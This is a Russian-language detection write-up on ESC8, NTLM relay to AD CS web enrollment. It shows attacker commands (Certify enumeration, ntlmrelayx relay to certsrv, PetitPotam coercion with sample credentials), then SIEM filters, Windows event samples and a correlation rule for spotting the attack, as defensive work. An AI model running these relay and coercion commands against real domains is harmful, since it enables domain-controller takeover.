# ESC8
Detecting ESC8: NTLM Relay to AD CS HTTP Endpoints

## Немного теории
Прежде чем обсуждать ESC8, полезно вспомнить, что такое атаки ретрансляции Windows New Technology LAN Manager (NTLM). При осуществлении NTLM Relay атаки злоумышленник "обманом" заставляет машину или службу пройти аутентификацию для злоумышленника. Затем злоумышленники ретранслируют (перенаправляют) эту аутентификацию на целевой хост по выбору. Используя этот метод, злоумышленники могут аутентифицироваться на компьютерах или в службах без необходимости знания учетных данных, которые они используют. Существует множество трюков, также известных как NTLM coercion (принуждение NTLM), заключающихся в первоначальной аутентификации клиента, и множество методов ретрансляции этой аутентификации на другой хост.

ESC8 использует функцию web enrollment interface в AD CS. Web enrollment interface в AD CS — это необязательная функция AD CS, которая обычно развертываются вместе с AD CS. Этот эндпоинт уязвим для атак NTLM Relay из-за особенностей обработки аутентификации. Во-первых, не все веб-интерфейсы, доступные в AD CS, поддерживают HTTPS, что необходимо для защиты от NTLM Relay атак. В дополнение к уязвимости к атакам NTLM Relay центр сертификации должен иметь хотя бы один опубликованный шаблон сертификата (Certificate Template), который позволяет выполнять аутентификацию клиента и регистрацию компьютера в домене — и такие шаблоны существуют в стандартной конфигурации. ESC8 можно использовать для получения сертификата на любой компьютер домена, включая контроллер домена. Все это в совокупности делает web enrollment interface в AD CS идеальным для злоумышленников для осуществления NTLM Relay атаки.

Таким образом, если в домене установлен AD CS вместе с уязвимым web enrollment endpoint и хотя бы одним опубликованным шаблоном сертификата, который позволяет регистрировать компьютер в домене и проверять подлинность клиента (а такие шаблоны существубт по умолчанию), то злоумышленник может скомпрометировать любой компьютер с запущенной службой spooler service.

Оставлю несколько ссылок на ресурсы, которые смогут подробнее рассказать об этой уязвимости:
1. https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#ntlm-relay-to-a-d-cs-http-endpoints-esc8
2. https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/ad-cs-abuse/esc8
3. https://www.crowe.com/cybersecurity-watch/exploiting-ad-cs-a-quick-look-at-esc1-esc8

## Эксплуатация
Давайте выясним, как выглядит атака ESC8, нацеленная на контроллер домена, в реальных условиях. Во-первых, злоумышленники могут использовать такой инструмент, как Certify, для перечисления конечных точек HTTP AD CS.
```cmd
Certify.exe cas
```
![Recon](https://1517081779-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FxkhNoWSfDoHUFGuP09Nv%2Fimage.png?alt=media&token=ca9f3f56-e8ff-43b1-b6b9-e0caccb48bfd)

Как только конечная точка идентифицирована, злоумышленник может использовать NTLM coercion, например, PrintSpooler Bug или PetitPotam, для получения NTLM-аутентификации от контроллера домена. Затем NTLM аутентификация передается на уязвимый web enrollment endpoint AD CS с помощью инструмента ntlmrelayx из набора скриптов Impacket. Благодаря Relay-атаке злоумышленник запрашивает сертификат для контроллера домена. Затем этот сертификат используется для запроса Kerberos TGT от имени контроллера домена.
После успешной эксплуатации злоумышленник может аутентифицироваться в домене как контроллер домена, имея доступ ко всему, к чему имеет доступ учетная запись компьютера контроллера домена.

![Scheme](https://www.crowe.com/-/media/crowe/llp/sc10-media/insights/publications/cybersecurity-watch/content-2000x1125/cduw2301-001w-cyberblog-ad-cs-charts-esc8.jpg?la=en-us&rev=95faa4da3b4c4c6a9b91564bd3448c82&hash=44F7B2264CE46A2772164D8674D5A897)

Вот так выглядит процесс эксплуатации от лица злоумышленника: 
```bash
ntlmrelayx.py -t http://ca.vuln.local/certsrv/certfnsh.asp -smb2support --adcs [--template VulnTemplate] --no-http-server --no-wcf-server --no-raw-server
python3 Petitpotam.py -d 'vuln.local' -u 'user' -p 'P@ssw0rd' 10.10.10.10 dc1
```
![ntlmrelayx.py](https://telegra.ph/file/1935d62c6229292537259.png)
![petitpotam.py](https://telegra.ph/file/1fb644ab3c83d6d65553b.png)
В данном случае используется два инструмента:
1. <a href="https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py">ntlmrelayx.py</a> из набора <a href="https://github.com/fortra/impacket">Impacket</a> (предустановлен в kali);
2. <a href="https://github.com/topotam/PetitPotam">petitpotam.py</a> от <a href="https://github.com/topotam">topotam</a>.

Использовать их может любой желающий, но только в законных целях!

## Выявление активности в логах CA
Теперь перейдём к выявлению атаки в логах CA. 
Нас интересуют несколько событий.
Первое из них — авторизация компьютерной учетной записи на CA. Фильтр для поиска соответствующих событий: 
```pdql
msgid = 4624 and dst.hostname = "ca" and status = "success" and subject.name endswith "$" and logon_service = "NtLmSsp"
```
![4624](https://telegra.ph/file/d5041ee03b9de5491ccc3.png)

Если в результате поиска найдено хоть одно событие, это уже аномалия, поскольку компьютеры в доменной инфраструктуре используют другие механизмы взаимодействия с CA.

Далее нас интересуют два события, связанных со службой сертификатов: 4886 (Certificate Services received a certificate request) и 4887 (Certificate Services approved a certificate request and issued a certificate).
Когда центр сертификации получает запрос на сертификат, он регистрирует событие 4886. 
Затем он оценивает запрос, загружая соответствующий шаблон сертификата, если это необходимо (событие 4898). Затем CA поместит запрос в папку Pending Requests (4889), немедленно выдаст сертификат (4887) или отклонит его (4888). 
Это событие регистрируется только в том случае, если на вкладке «Audit» свойств CA в оснастке MMC служб сертификации включен параметр «Issue and manage certificate requests» и, конечно, если подкатегория аудита служб сертификации включена с помощью auditpol.
Поскольку суть атаки состоит в запросе и получении сертификата, нас интересуют именно события 4886 и 4887. Применим фильтры в MP SIEM для их поиска:
```pdql
msgid = 4886 and subject.name endswith "$"
```
![4886](https://telegra.ph/file/c8ed957a8ddb47e97ba3a.png)

```pdql
msgid = 4887 and subject.name endswith "$"
```
![4886](https://telegra.ph/file/1731eb95404ed0f4752c1.png)
Если мы посмотрим на состав этих событий, то поймём, что они очень неинформативные. Особенно событие 4886, которое вообще не несёт практически никакой полезной нам с точки зрения расследования потенциального инцидента:

```json
"EventData": {
  "Data": [
    {
      "text": "1337",
      "Name": "RequestId"
    },
    {
      "text": "VULN\\DC1$",
      "Name": "Requester"
    },
    {
      "text": "\nCertificateTemplate:DomainController\nccm:CA.vuln.local",
      "Name": "Attributes"
    }
  ]
}
```
Событие 4887, говорящее об успешной выдаче сертификата, содержит на два поля больше, одно из которых говорящее: SubjectKeyIdentifier. Пример значения: "2e 81 c4 62 20 4a c5 32 4f 33 29 11 6c bf 8c f9 53 4a 78 46". На этом разница в их "инфомративности" заканчивается.
Из этих событий совсем непонятно, кто именно запрашивает сертификат, и установить источник из логов с CA возможно только по косвенным признакам: входящим соединениям к web enrollment endfpoint. Тут нам на помощь приходит событие 5156. Причем важно отметить, что нас интересует событие входящего соединения, и в данном случае у нас будут "инвертированы" источник и хост назначения.
Так, в поле SourceAddress будет адрес нашего CA, а в поле DestAddress будет адрес источника нашей атаки. Пусть CA имеет адрес 172.16.0.10, а атакующий — 10.10.10.10, тогда событие будет содержать следующие поля:
```json
...
{
  "text": "172.0.0.10",
  "Name": "SourceAddress"
},
{
  "text": "80",
  "Name": "SourcePort"
},
{
  "text": "10.10.10.10",
  "Name": "DestAddress"
},
{
  "text": "37092",
  "Name": "DestPort"
},
...
```
Так, найти нужные события помогает следующий фильтр:
```pdql
event_src.host = "ca.vuln.local" and msgid = 5156 and src.port = 80
```
![5156](https://telegra.ph/file/dc633afc4ad08b329f3d2.png)

На основании поведенного исследования я написал простую корреляцию, отслеживающую появление указанных выше событий.
Корреляция основана на четырёх событиях, происходящих в течение ондой минуты. Опытным путем было выявлено, что разница между первым (сетевое соединение 5156) и последним событием (выдача сертификата 4887) составляет не более 30 секунд, так что значение в одну минуту взято с запасом.

Также корреляция использует запрос CertificationAuthority к табличному списку Certification_Authority_hosts, содержащему два строковых поля: ip и fqdn. Табличный список необходимо создать заранее, и важно внести в него записи с актуальными CA в домене.

Так как такая активность в целом не может наблюдаться в доменной инфраструктуре, ложных срабатываний у корреляции не будет.
Корреляция приложена в виде .txt файла, а также в формате .kb для её импорта в Knoledge Base MP SIEM.
